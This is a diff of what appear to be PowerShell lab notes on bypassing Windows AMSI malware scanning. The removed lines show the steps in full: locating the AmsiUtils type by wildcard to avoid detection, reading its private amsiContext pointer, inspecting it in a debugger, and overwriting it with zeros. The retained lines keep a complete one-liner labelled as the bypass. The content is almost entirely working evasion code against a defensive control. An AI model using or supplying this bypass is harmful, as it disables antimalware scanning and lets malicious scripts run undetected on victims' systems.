@@ -1,40 +1,4 @@
-PS C:\Users\Offsec> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') 
-<blocked>
 
-$a=[Ref].Assembly.GetTypes()
-Foreach($b in $a) {if ($b.Name -like "*iUtils") {$b}}
-Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
-$c.GetFields('NonPublic,Static')
-$d=$c.GetFields('NonPublic,Static')
-Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
-$f.GetValue($null)
-  --> 1628197703216
-
-#Open programmer calculator and convert the string to hex ‭17B18254E30‬
-#Now attach to debugger and run
-  --> dc 0x2ACEF5FA500
-
-
-#Now lets put together and overwrite memory to 0000
- g
-$a=[Ref].Assembly.GetTypes()
-Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
-$d=$c.GetFields('NonPublic,Static')
-Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
-$g=$f.GetValue($null)
-[IntPtr]$ptr=$g
-[Int32[]]$buf=@(0)
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
-
-break
-
- -->dc 0x2ACEF5FA500
-
- # Now lets switch back to debugger 
-
- g
-
- 'amsiutils' -> No detection
 
  # Finally one liner script to bypass is :
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
